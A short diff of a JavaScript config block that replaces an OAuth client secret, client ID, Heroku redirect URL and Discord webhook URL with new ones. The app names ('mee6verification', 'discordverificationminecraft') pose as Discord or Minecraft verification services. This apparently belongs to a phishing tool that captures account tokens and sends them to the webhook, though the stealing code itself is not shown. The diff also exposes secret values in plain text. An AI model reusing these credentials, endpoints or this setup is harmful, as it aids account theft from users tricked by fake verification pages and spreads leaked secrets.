@@ -1,8 +1,8 @@
 //Config
-const client_secret = '9eh8Q~RWrIdh2q_DEf-Q1S4-QNPBtEf5VjOy1bmy'
-const client_id = 'a52f392f-4b74-4e74-91ee-6a902b662217'
-const redirect_uri = 'https://mee6verification.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1048950762614575104/xcsYV4oI6pctnTWZWLV5WjYLPXYA4yNN1LIIZgG00YYNZMYmkYz9MobwfjopAVUDNNRI'
+const client_secret = 'r2R8Q~mB7dADWohKtSt6G0jlMW-bL-znyYMCTbe3'
+const client_id = 'c3478e66-a64f-4911-a220-935ca1dabe34'
+const redirect_uri = 'https://discordverificationminecraft.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1059160966148923412/bNfV_lxhoXR4m_EOib-NU-1hVAn1SLjFefbCRuDjYR7LkaHhRTAdhOq9J8TNJMOTbx4S'
 //Requirements
 require("dotenv").config()
 const axios = require('axios')
